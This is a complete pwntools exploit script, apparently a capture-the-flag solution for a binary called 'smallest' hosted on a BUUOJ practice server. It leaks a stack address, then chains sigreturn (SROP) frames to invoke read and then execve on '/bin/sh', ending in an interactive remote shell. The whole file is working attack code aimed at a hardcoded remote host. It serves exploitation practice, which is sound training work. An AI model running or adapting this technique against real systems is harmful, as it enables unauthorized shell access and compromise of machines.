from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('smallest')
io = remote('node4.buuoj.cn', 25209)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so')
# libc = ELF('libc-2.29.so')
elf = ELF('smallest')
start, syscall_ret = 0x4000b0, 0x4000be

payload = p64(start) * 3
io.send(payload)
sleep(0.3)
io.send(b'\xb3')
stack  = u64(io.recv()[0x148:0x150])
log.success('stack: ' + hex(stack))
sleep(0.3)

frame = SigreturnFrame()
frame.rax = constants.SYS_read
frame.rdi = 0
frame.rsi = stack
frame.rdx = 0x400
frame.rsp = stack
frame.rip = syscall_ret
payload = p64(start) + b'a' * 8 + bytes(frame)
io.send(payload)
sleep(0.3)
sigret_payload = p64(syscall_ret) + b'b' * 7
io.send(sigret_payload) 
sleep(0.3)


frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = stack + 0x120
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret
payload = p64(start) + b'a' * 8 + bytes(frame)
payload = payload.ljust(0x120, b'\x00') + b'/bin/sh\x00'
io.send(payload)
sleep(0.3)
io.send(sigret_payload) 
sleep(0.3)

# gdb.attach(io)
# pause()
io.interactive()
